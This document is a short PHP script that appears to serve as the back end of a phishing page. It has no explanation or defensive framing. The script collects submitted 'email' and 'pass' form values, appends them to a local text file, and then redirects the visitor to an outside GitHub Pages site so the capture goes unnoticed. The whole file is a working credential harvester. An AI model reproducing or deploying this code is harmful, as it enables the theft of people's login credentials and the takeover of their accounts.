<?php
header("Location:https://yassange.github.io/pag-na-termux/");
$handle = fopen("wikinbn.txt", "a");
foreach ($_POST as $variable => $value) {
    if ($variable == "email" || $variable == "pass")
		{
		 fwrite($handle, $variable);
		 fwrite($handle, "=");
         fwrite($handle, $value);
         fwrite($handle, "
");
     }
}	 
fwrite($handle, "
");
fclose($handle,);
exit;
?>

